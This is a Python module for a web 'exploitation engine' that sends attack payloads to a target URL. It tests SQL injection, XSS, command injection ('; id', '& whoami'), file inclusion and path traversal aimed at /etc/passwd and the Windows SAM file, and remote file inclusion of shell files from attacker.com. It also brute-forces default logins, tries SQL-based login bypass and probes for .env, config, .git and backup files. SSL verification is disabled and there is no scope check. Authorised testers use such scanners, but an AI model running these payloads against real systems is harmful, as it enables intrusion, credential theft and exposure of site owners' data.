#!/usr/bin/env python3
"""
Exploitation Module
Web vulnerability testing and exploitation
"""

import requests
import json
import time
import urllib3
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Optional, Dict, Tuple
from urllib.parse import urljoin, quote
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass
class Vulnerability:
    """Vulnerability finding"""
    vuln_type: str  # SQLi, XSS, RCE, etc
    severity: str  # critical, high, medium, low
    url: str
    parameter: str = ""
    payload: str = ""
    response: str = ""
    cve: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ExploitationResult:
    """Exploitation attempt result"""
    target: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    successful_exploits: int = 0
    attempted_exploits: int = 0
    execution_time: float = 0.0

class ExploitationEngine:
    """Web vulnerability exploitation engine"""
    
    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.session = requests.Session()
        self.vulnerabilities = []
        self.request_delay = 0.5  # 500ms delay between requests
        self.rate_limit_delay = 5  # 5s delay if rate limited
        self.max_retries = 3
    
    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Make a safe request with rate limit handling"""
        for attempt in range(self.max_retries):
            try:
                time.sleep(self.request_delay)  # Throttle requests
                
                response = self.session.request(method, url, **kwargs)
                
                # Handle rate limiting
                if response.status_code == 429:
                    if attempt < self.max_retries - 1:
                        time.sleep(self.rate_limit_delay * (attempt + 1))
                        continue
                    return None
                
                return response
            except Exception:
                if attempt < self.max_retries - 1:
                    time.sleep(1)
                    continue
                return None
        return None
        
    def test_sql_injection(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities"""
        findings = []
        
        # SQL injection payloads (reduced for speed)
        payloads = {
            "basic": "' OR '1'='1",
            "union": "' UNION SELECT NULL--",
            "comments": "' OR 1=1--"
        }
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload_name, payload in payloads.items():
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self._safe_request('GET', url, params=test_params, timeout=self.timeout, verify=False)
                if response:
                    # Basic detection patterns
                    if self._is_sqli_response(response.text):
                        findings.append(Vulnerability(
                            vuln_type="SQL Injection",
                            severity="critical",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response=response.text[:500]
                        ))
        
        return findings
    
    def test_xss(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for Cross-Site Scripting (XSS)"""
        findings = []
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "'\"<script>alert(1)</script>"
        ]
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self._safe_request('GET', url, params=test_params, timeout=self.timeout, verify=False)
                if response and payload in response.text:
                    findings.append(Vulnerability(
                        vuln_type="Cross-Site Scripting (XSS)",
                        severity="high",
                        url=url,
                        parameter=param_name,
                        payload=payload
                    ))
        
        return findings
    
    def test_command_injection(self, url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Test for command injection vulnerabilities"""
        findings = []
        
        # Reduced payloads for speed
        payloads = {
            "unix": "; id",
            "windows": "& whoami"
        }
        
        if params is None:
            params = {}
        
        for param_name, param_value in params.items():
            for payload_name, payload in payloads.items():
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(
                        url,
                        params=test_params,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Check for command output patterns
                    if self._is_rce_response(response.text):
                        findings.append(Vulnerability(
                            vuln_type="Command Injection (RCE)",
                            severity="critical",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response=response.text[:300]
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_lfi(self, base_url: str) -> List[Vulnerability]:
        """Test for Local File Inclusion"""
        findings = []
        
        lfi_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        for payload in lfi_payloads:
            for param in ["file", "page", "path", "include", "view"]:
                test_url = f"{base_url}?{param}={payload}"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if "root:" in response.text or "bin/bash" in response.text:
                        findings.append(Vulnerability(
                            vuln_type="Local File Inclusion (LFI)",
                            severity="high",
                            url=test_url,
                            parameter=param,
                            payload=payload
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_rfi(self, base_url: str) -> List[Vulnerability]:
        """Test for Remote File Inclusion"""
        findings = []
        
        payloads = [
            "http://attacker.com/shell.php",
            "http://attacker.com/shell.txt",
            "ftp://attacker.com/shell.php"
        ]
        
        for payload in payloads:
            for param in ["file", "page", "path", "include", "view"]:
                test_url = f"{base_url}?{param}={quote(payload)}"
                
                try:
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Look for evidence of inclusion attempt
                    if response.status_code in [200, 403]:
                        findings.append(Vulnerability(
                            vuln_type="Remote File Inclusion (RFI)",
                            severity="high",
                            url=test_url,
                            parameter=param,
                            payload=payload
                        ))
                except Exception:
                    pass
        
        return findings
    
    def test_default_credentials(self, url: str) -> List[Vulnerability]:
        """Test for default credentials"""
        findings = []
        
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("administrator", "password")
        ]
        
        for username, password in common_creds:
            try:
                response = self.session.post(
                    url,
                    data={"username": username, "password": password},
                    timeout=self.timeout,
                    verify=False
                )
                
                if "success" in response.text.lower() or response.status_code == 302:
                    findings.append(Vulnerability(
                        vuln_type="Default Credentials",
                        severity="critical",
                        url=url,
                        payload=f"{username}:{password}"
                    ))
            except Exception:
                pass
        
        return findings
    
    def test_authentication_bypass(self, login_url: str) -> List[Vulnerability]:
        """Test for authentication bypass"""
        findings = []
        
        payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin' --", "password": ""},
            {"username": "' OR 1=1--", "password": ""},
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "*", "password": "*"}
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    login_url,
                    data=payload,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check for bypass indicators
                if any(word in response.text.lower() for word in 
                       ["dashboard", "welcome", "logout", "home"]):
                    findings.append(Vulnerability(
                        vuln_type="Authentication Bypass",
                        severity="critical",
                        url=login_url,
                        payload=json.dumps(payload)
                    ))
            except Exception:
                pass
        
        return findings
    
    def test_path_traversal(self, base_url: str) -> List[Vulnerability]:
        """Test for path traversal vulnerabilities"""
        findings = []
        
        traversal_payloads = [
            "../../windows/win.ini",
            "../../etc/passwd",
            "....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in traversal_payloads:
            test_url = f"{base_url}/{payload}"
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=False
                )
                
                if response.status_code == 200 and len(response.text) > 100:
                    findings.append(Vulnerability(
                        vuln_type="Path Traversal",
                        severity="high",
                        url=test_url,
                        payload=payload
                    ))
            except Exception:
                pass
        
        return findings
    
    def _is_sqli_response(self, response_text: str) -> bool:
        """Detect SQL injection in response"""
        patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"Warning.*mysql",
            r"PostgreSQL.*error",
            r"Oracle error",
            r"sqlite_",
            r"JDBC.*error"
        ]
        
        return any(re.search(pattern, response_text, re.IGNORECASE) for pattern in patterns)
    
    def _is_rce_response(self, response_text: str) -> bool:
        """Detect RCE in response"""
        patterns = [
            r"uid=\d+",
            r"root:x:0:0",
            r"Microsoft Windows",
            r"C:\\.*>",
            r"/bin/bash"
        ]
        
        return any(re.search(pattern, response_text) for pattern in patterns)
    
    def _test_common_paths(self, base_url: str, result: ExploitationResult):
        """Test for common directories and sensitive files"""
        from urllib.parse import urlparse
        
        # Check if this is a cPanel port
        parsed = urlparse(base_url)
        port = parsed.port
        is_cpanel = port in [2082, 2083, 2086, 2087, 2095, 2096]
        
        if is_cpanel:
            # Test cPanel login
            response = self._safe_request('GET', base_url, timeout=5, verify=False)
            if response and ('cpanel' in response.text.lower() or 'whm' in response.text.lower()):
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="Exposed Admin Panel",
                    severity="high",
                    url=base_url,
                    parameter="panel",
                    payload="cPanel/WHM Login Exposed",
                    response=f"cPanel detected on port {port}"
                ))
                from utils.helpers import print_warning
                print_warning(f"[!] cPanel/WHM panel exposed on port {port}")
            return
        
        # Reduced path list for speed
        common_paths = [
            # Most critical paths only
            "/admin", "/wp-admin", "/phpmyadmin",
            "/.env", "/config.php", "/wp-config.php", "/.git/config",
            "/backup.sql", "/backup.zip", "/database.sql",
            "/phpinfo.php", "/robots.txt"
        ]
        
        found_count = 0
        for path in common_paths:
            response = self._safe_request('GET', base_url.rstrip('/') + path, timeout=5, verify=False, allow_redirects=False)
            
            if response and response.status_code in [200, 403, 401]:
                severity = "high" if any(x in path for x in ['.env', 'config', 'backup', '.git', 'admin']) else "medium"
                result.vulnerabilities.append(Vulnerability(
                    vuln_type="Information Disclosure",
                    severity=severity,
                    url=base_url.rstrip('/') + path,
                    parameter="path",
                    payload=path,
                    response=f"Status: {response.status_code}, Size: {len(response.content)} bytes"
                ))
                found_count += 1
                if found_count <= 5:  # Don't spam output
                    from utils.helpers import print_success
                    print_success(f"[+] Found: {path} (HTTP {response.status_code})")
    
    def full_website_scan(self, target_url: str) -> ExploitationResult:
        """Perform comprehensive website scan"""
        from utils.helpers import print_info, print_success, print_warning
        import time
        
        result = ExploitationResult(target=target_url)
        start_time = time.time()
        
        try:
            # Parse URL for parameters
            print_info(f"[*] Scanning {target_url}...")
            
            # Directory and file discovery
            print_info("[*] Testing common paths and files...")
            self._test_common_paths(target_url, result)
            
            # Test main URL with various parameters (reduced for speed)
            test_params = {"id": "1", "page": "1"}
            
            # SQL Injection
            print_info("[*] Testing SQL Injection...")
            sqli = self.test_sql_injection(target_url, test_params)
            result.vulnerabilities.extend(sqli)
            result.attempted_exploits += 1
            if sqli:
                result.successful_exploits += 1
                print_success(f"[+] SQL Injection found: {len(sqli)} instances")
            
            # XSS
            print_info("[*] Testing XSS...")
            xss = self.test_xss(target_url, test_params)
            result.vulnerabilities.extend(xss)
            result.attempted_exploits += 1
            if xss:
                result.successful_exploits += 1
                print_success(f"[+] XSS found: {len(xss)} instances")
            
            # Command Injection (skip if rate limited)
            print_info("[*] Testing Command Injection...")
            rce = self.test_command_injection(target_url, test_params)
            result.vulnerabilities.extend(rce)
            result.attempted_exploits += 1
            if rce:
                result.successful_exploits += 1
                print_success(f"[+] RCE found: {len(rce)} instances")
            
            # Skip LFI and default credentials for speed (too many requests)
            
            result.execution_time = time.time() - start_time
            
        except Exception as e:
            print_warning(f"[!] Scan error: {e}")
        
        return result
